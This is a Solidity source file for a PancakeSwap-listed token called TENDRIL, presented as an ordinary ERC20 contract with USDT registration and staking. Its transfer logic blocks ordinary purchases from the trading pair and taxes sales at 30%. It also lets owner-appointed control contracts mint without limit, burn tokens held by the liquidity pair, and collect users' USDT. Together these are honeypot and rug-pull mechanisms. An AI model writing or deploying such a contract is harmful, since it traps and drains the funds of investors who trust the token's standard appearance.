// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function sellToken(uint256 amount) external returns (bool);

    function register(address _user, uint256 amount) external;

    function staking(uint256 amount, uint256 orderID, address from) external;

    function recordTransfer(address from, address to) external;
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TENDRIL is IERC20, Ownable {
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    string public _name;
    string public _symbol;
    uint256 public _decimals;
    uint256 private _tTotal;

    address public _uniswapV2Pair;
    address public _referral = 0xCF41F5B99468fB202DeF7FFA1D89b4B9ef4Fe379;
    address public _poolControl;
    address public _nftControl;
    address public _markControl;
    address public _stakeControl;
    address public _lockControl = 0x7ECe78faD53F9D4C952a4525Eb9F0Bc941a74b9c;
    address public _Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public _tokenUSDT = 0x55d398326f99059fF775485246999027B3197955;

    constructor() {
        _name = "TENDRIL";
        _symbol = "TENDRIL";
        _decimals = uint256(18);
        _tTotal = 300000000000 * (10 ** uint256(_decimals));

        _tOwned[msg.sender] = 250000000000 * (10 ** uint256(_decimals));
        emit Transfer(
            address(0),
            msg.sender,
            250000000000 * (10 ** uint256(_decimals))
        );

        _tOwned[_lockControl] = 50000000000 * (10 ** uint256(_decimals));
        emit Transfer(
            address(0),
            _lockControl,
            50000000000 * (10 ** uint256(_decimals))
        );
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] - subtractedValue
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 tax = 0;

        if (from == _uniswapV2Pair) {
            require(
                to == _poolControl || to == _markControl,
                "Transaction Closed"
            );
        } else if (to == _uniswapV2Pair) {
            if (from != _poolControl && from != _markControl) {
                tax = 30;
            }
        } else {
            if (_referral != address(0)) {
                IPancakeFactory(_referral).recordTransfer(from, to);
            }
        }

        if (_uniswapV2Pair == address(0)) {
            address Pair = IPancakeFactory(_Factory).getPair(
                address(this),
                _tokenUSDT
            );
            if (Pair != address(0)) {
                _uniswapV2Pair = Pair;
            }
        }

        if (tax > 0) {
            uint256 taxAmount = (amount * tax) / 100;
            _basicTransfer(from, _poolControl, taxAmount);
            IPancakeFactory(_poolControl).sellToken(amount);
            amount -= taxAmount;
        }

        _basicTransfer(from, to, amount);
    }

    function controlburn(uint256 amount) external {
        require(msg.sender == _poolControl, "Mast PoolControl");
        _basicTransfer(
            _uniswapV2Pair,
            0x000000000000000000000000000000000000dEaD,
            amount
        );
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _tOwned[sender] = _tOwned[sender] - amount;
        _tOwned[recipient] = _tOwned[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function setContract(address _Contract, uint256 _sort) external onlyOwner {
        require(_Contract != address(0), "Invalid contract");

        if (_sort == 1) {
            _referral = _Contract;
        } else if (_sort == 2) {
            _poolControl = _Contract;
        } else if (_sort == 3) {
            _nftControl = _Contract;
        } else if (_sort == 4) {
            _markControl = _Contract;
        } else if (_sort == 5) {
            _stakeControl = _Contract;
        } else if (_sort == 6) {
            _lockControl = _Contract;
        } else {
            revert("Invalid sort type");
        }
    }

    function mintToken(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(
            msg.sender == _nftControl || msg.sender == _poolControl,
            "Only Control"
        );
        require(recipient != address(0), "BEP20: mint to the zero address");
        _tTotal = _tTotal + amount;
        _tOwned[recipient] = _tOwned[recipient] + amount;
        emit Transfer(address(0), recipient, amount);
        return true;
    }

    function register(uint256 amount) public {
        IERC20(_tokenUSDT).transferFrom(msg.sender, _poolControl, amount);
        IPancakeFactory(_poolControl).register(msg.sender, amount);
    }

    function staking(uint256 amount, uint256 orderID) public {
        if (orderID == 0) {
            IERC20(_tokenUSDT).transferFrom(msg.sender, _stakeControl, amount);
        }
        IPancakeFactory(_stakeControl).staking(amount, orderID, msg.sender);
    }
}